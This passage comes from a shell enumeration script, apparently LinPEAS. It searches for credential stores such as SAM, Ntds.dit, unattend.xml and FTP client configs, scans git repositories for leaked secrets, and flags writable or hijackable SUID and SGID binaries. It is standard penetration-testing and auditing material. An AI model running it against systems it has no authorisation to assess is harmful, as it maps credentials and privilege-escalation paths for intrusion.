    if ! [ "`echo \"$PSTORAGE_INTERESTING_LOGS\" | grep -E \"error\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "error.log"; fi; fi; printf "%s" "$PSTORAGE_INTERESTING_LOGS" | grep -E "error\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,error\.log$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_WINDOWS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Windows Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.inf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.inf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.inf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.inf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"\.rdg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.rdg"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "\.rdg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.rdg$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"AppEvent\.Evt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "AppEvent.Evt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "AppEvent\.Evt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,AppEvent\.Evt$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ConsoleHost_history\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ConsoleHost_history.txt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ConsoleHost_history\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ConsoleHost_history\.txt$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"FreeSSHDservice\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "FreeSSHDservice.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "FreeSSHDservice\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,FreeSSHDservice\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"NetSetup\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "NetSetup.log"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "NetSetup\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,NetSetup\.log$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"Ntds\.dit$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "Ntds.dit"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "Ntds\.dit$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,Ntds\.dit$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"protecteduserkey\.bin$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "protecteduserkey.bin"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "protecteduserkey\.bin$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,protecteduserkey\.bin$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"RDCMan\.settings$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "RDCMan.settings"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "RDCMan\.settings$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,RDCMan\.settings$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SAM$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SAM"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SAM$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SAM$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SYSTEM$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SYSTEM"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SYSTEM$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SYSTEM$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"SecEvent\.Evt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "SecEvent.Evt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "SecEvent\.Evt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,SecEvent\.Evt$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"appcmd\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "appcmd.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "appcmd\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,appcmd\.exe$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"bash\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "bash.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "bash\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,bash\.exe$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"datasources\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "datasources.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "datasources\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,datasources\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"default\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "default.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "default\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,default\.sav$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"drives\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "drives.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "drives\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,drives\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"groups\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "groups.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "groups\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,groups\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"https-xampp\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "https-xampp.conf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "https-xampp\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,https-xampp\.conf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"https\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "https.conf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "https\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,https\.conf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"iis6\.log$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "iis6.log"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "iis6\.log$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,iis6\.log$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"index\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "index.dat"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "index\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,index\.dat$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"my\.cnf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "my.cnf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "my\.cnf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,my\.cnf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"my\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "my.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "my\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,my\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ntuser\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ntuser.dat"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ntuser\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ntuser\.dat$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"pagefile\.sys$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pagefile.sys"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "pagefile\.sys$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pagefile\.sys$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"printers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "printers.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "printers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,printers\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"recentservers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "recentservers.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "recentservers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,recentservers\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"scclient\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "scclient.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "scclient\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,scclient\.exe$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"scheduledtasks\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "scheduledtasks.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "scheduledtasks\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,scheduledtasks\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"security\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "security.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "security\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,security\.sav$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"server\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "server.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "server\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,server\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"setupinfo$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "setupinfo"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "setupinfo$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,setupinfo$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"setupinfo\.bak$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "setupinfo.bak"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "setupinfo\.bak$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,setupinfo\.bak$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sitemanager\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sitemanager.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sitemanager\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sitemanager\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sites\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sites.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sites\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sites\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"software$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "software"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "software$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,software$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"software\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "software.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "software\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,software\.sav$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sysprep\.inf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sysprep.inf"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sysprep\.inf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sysprep\.inf$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"sysprep\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "sysprep.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "sysprep\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,sysprep\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"system\.sav$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "system.sav"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "system\.sav$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,system\.sav$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.txt"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.txt$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattend\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattend.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattend\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattend\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"unattended\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "unattended.xml"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "unattended\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,unattended\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"wcx_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wcx_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "wcx_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wcx_ftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"ws_ftp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ws_ftp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "ws_ftp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ws_ftp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"web.*\.config$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "web*.config"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "web.*\.config$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,web.*\.config$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"winscp\.ini$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "winscp.ini"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "winscp\.ini$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,winscp\.ini$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_WINDOWS\" | grep -E \"wsl\.exe$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "wsl.exe"; fi; fi; printf "%s" "$PSTORAGE_WINDOWS" | grep -E "wsl\.exe$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,wsl\.exe$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_OTHER_INTERESTING" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Other Interesting Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.bashrc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".bashrc"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.bashrc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.bashrc$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.google_authenticator$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".google_authenticator"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.google_authenticator$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.google_authenticator$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"hosts\.equiv$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "hosts.equiv"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "hosts\.equiv$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,hosts\.equiv$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.lesshst$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".lesshst"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.lesshst$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.lesshst$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.plan$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".plan"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.plan$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.plan$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.profile$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".profile"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.profile$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.profile$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.recently-used\.xbel$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".recently-used.xbel"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.recently-used\.xbel$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.recently-used\.xbel$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.rhosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".rhosts"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.rhosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.rhosts$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_OTHER_INTERESTING\" | grep -E \"\.sudo_as_admin_successful$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".sudo_as_admin_successful"; fi; fi; printf "%s" "$PSTORAGE_OTHER_INTERESTING" | grep -E "\.sudo_as_admin_successful$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.sudo_as_admin_successful$,${SED_RED},"; done; echo "";
fi


if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
  print_2title "Checking leaks in git repositories"
  printf "%s\n" "$PSTORAGE_GITHUB" | while read f; do
    if echo "$f" | grep -Eq ".git$"; then
      git_dirname=$(dirname "$f")
      if [ "$MACPEAS" ]; then
        execBin "GitLeaks (checking $git_dirname)" "https://github.com/zricethezav/gitleaks" "$FAT_LINPEAS_GITLEAKS_MACOS" "detect -s '$git_dirname' -v | grep -E 'Description|Match|Secret|Message|Date'"
      else
        execBin "GitLeaks (checking $git_dirname)" "https://github.com/zricethezav/gitleaks" "$FAT_LINPEAS_GITLEAKS_LINUX" "detect -s '$git_dirname' -v | grep -E 'Description|Match|Secret|Message|Date'"
      fi
    fi
  done
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q interesting_files; then
print_title "Interesting Files"

check_critial_root_path(){
  folder_path="$1"
  if [ -w "$folder_path" ]; then echo "You have write privileges over $folder_path" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  if [ "$(find $folder_path -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null)" ]; then echo "You have write privileges over $(find $folder_path -type f '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')')" | sed -${E} "s,.*,${SED_RED_YELLOW},"; fi
  if [ "$(find $folder_path -type f -not -user root 2>/dev/null)" ]; then echo "The following files aren't owned by root: $(find $folder_path -type f -not -user root 2>/dev/null)"; fi
}

print_2title "SUID"
print_info "sewerd"
if ! [ "$STRINGS" ]; then
  echo_not_found "strings"
fi
if ! [ "$STRACE" ]; then
  echo_not_found "strace"
fi
suids_files=$(find $ROOT_FOLDER -perm -4000 -type f ! -path "/dev/*" 2>/dev/null)
for s in $suids_files; do
  s=$(ls -lahtr "$s")
  if echo "$s" | grep -qE "^total"; then break; fi

  sname="$(echo $s | awk '{print $9}')"
  if [ "$sname" = "."  ] || [ "$sname" = ".."  ]; then
    true 
  elif ! [ "$IAMROOT" ] && [ -O "$sname" ]; then
    echo "You own the SUID file: $sname" | sed -${E} "s,.*,${SED_RED},"
  elif ! [ "$IAMROOT" ] && [ -w "$sname" ]; then 
    echo "You can write SUID file: $sname" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  else
    c="a"
    for b in $sidB; do
      if echo $s | grep -q $(echo $b | cut -d % -f 1); then
        echo "$s" | sed -${E} "s,$(echo $b | cut -d % -f 1),${C}[1;31m&  --->  $(echo $b | cut -d % -f 2)${C}[0m,"
        c=""
        break;
      fi
    done;
    if [ "$c" ]; then
      if echo "$s" | grep -qE "$sidG1" || echo "$s" | grep -qE "$sidG2" || echo "$s" | grep -qE "$sidG3" || echo "$s" | grep -qE "$sidG4" || echo "$s" | grep -qE "$sidVB" || echo "$s" | grep -qE "$sidVB2"; then
        echo "$s" | sed -${E} "s,$sidG1,${SED_GREEN}," | sed -${E} "s,$sidG2,${SED_GREEN}," | sed -${E} "s,$sidG3,${SED_GREEN}," | sed -${E} "s,$sidG4,${SED_GREEN}," | sed -${E} "s,$sidVB,${SED_RED_YELLOW}," | sed -${E} "s,$sidVB2,${SED_RED_YELLOW},"
      else
        echo "$s (Unknown SUID binary!)" | sed -${E} "s,/.*,${SED_RED},"
        printf $ITALIC
        if ! [ "$FAST" ] && [ "$STRINGS" ]; then
          $STRINGS "$sname" 2>/dev/null | sort | uniq | while read sline; do
            sline_first="$(echo "$sline" | cut -d ' ' -f1)"
            if echo "$sline_first" | grep -qEv "$cfuncs"; then
              if echo "$sline_first" | grep -q "/" && [ -f "$sline_first" ]; then 
                if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then 
                  printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
                fi
              else 
                if [ ${#sline_first} -gt 2 ] && command -v "$sline_first" 2>/dev/null | grep -q '/' && echo "$sline_first" | grep -Eqv "\.\."; then 
                  printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline) (https://tinyurl.com/suidpath)\n"
                fi
              fi
            fi
          done
          if ! [ "$FAST" ] && [ "$TIMEOUT" ] && [ "$STRACE" ] && ! [ "$NOTEXPORT" ] && [ -x "$sname" ]; then
            printf $ITALIC
            echo "----------------------------------------------------------------------------------------"
            echo "  --- Trying to execute $sname with strace in order to look for hijackable libraries..."
            OLD_LD_LIBRARY_PATH=$LD_LIBRARY_PATH
            export LD_LIBRARY_PATH=""
            timeout 2 "$STRACE" "$sname" 2>&1 | grep -i -E "open|access|no such file" | sed -${E} "s,open|access|No such file,${SED_RED}$ITALIC,g"
            printf $NC
            export LD_LIBRARY_PATH=$OLD_LD_LIBRARY_PATH
            echo "----------------------------------------------------------------------------------------"
            echo ""
          fi
        fi
      fi
    fi
  fi
done;
echo ""

print_2title "SGID"
print_info "gewered"
sgids_files=$(find $ROOT_FOLDER -perm -2000 -type f ! -path "/dev/*" 2>/dev/null)
for s in $sgids_files; do
  s=$(ls -lahtr "$s")
  if echo "$s" | grep -qE "^total";then break; fi

  sname="$(echo $s | awk '{print $9}')"
  if [ "$sname" = "."  ] || [ "$sname" = ".."  ]; then
    true 
  elif ! [ "$IAMROOT" ] && [ -O "$sname" ]; then
    echo "You own the SGID file: $sname" | sed -${E} "s,.*,${SED_RED},"
  elif ! [ "$IAMROOT" ] && [ -w "$sname" ]; then 
    echo "You can write SGID file: $sname" | sed -${E} "s,.*,${SED_RED_YELLOW},"
  else
    c="a"
    for b in $sidB; do
      if echo "$s" | grep -q $(echo $b | cut -d % -f 1); then
        echo "$s" | sed -${E} "s,$(echo $b | cut -d % -f 1),${C}[1;31m&  --->  $(echo $b | cut -d % -f 2)${C}[0m,"
        c=""
        break;
      fi
    done;
    if [ "$c" ]; then
      if echo "$s" | grep -qE "$sidG1" || echo "$s" | grep -qE "$sidG2" || echo "$s" | grep -qE "$sidG3" || echo "$s" | grep -qE "$sidG4" || echo "$s" | grep -qE "$sidVB" || echo "$s" | grep -qE "$sidVB2"; then
        echo "$s" | sed -${E} "s,$sidG1,${SED_GREEN}," | sed -${E} "s,$sidG2,${SED_GREEN}," | sed -${E} "s,$sidG3,${SED_GREEN}," | sed -${E} "s,$sidG4,${SED_GREEN}," | sed -${E} "s,$sidVB,${SED_RED_YELLOW}," | sed -${E} "s,$sidVB2,${SED_RED_YELLOW},"
      else
        echo "$s (Unknown SGID binary)" | sed -${E} "s,/.*,${SED_RED},"
        printf $ITALIC
        if ! [ "$FAST" ] && [ "$STRINGS" ]; then
          $STRINGS "$sname" | sort | uniq | while read sline; do
            sline_first="$(echo $sline | cut -d ' ' -f1)"
            if echo "$sline_first" | grep -qEv "$cfuncs"; then
              if echo "$sline_first" | grep -q "/" && [ -f "$sline_first" ]; then 
                if [ -O "$sline_first" ] || [ -w "$sline_first" ]; then 
                  printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is using $RED$sline_first$NC$ITALIC and you can modify it (strings line: $sline)\n"
                fi
              else
                if [ ${#sline_first} -gt 2 ] && command -v "$sline_first" 2>/dev/null | grep -q '/'; then
                  printf "$ITALIC  --- It looks like $RED$sname$NC$ITALIC is executing $RED$sline_first$NC$ITALIC and you can impersonate it (strings line: $sline)\n"
                fi
              fi
            fi
          done
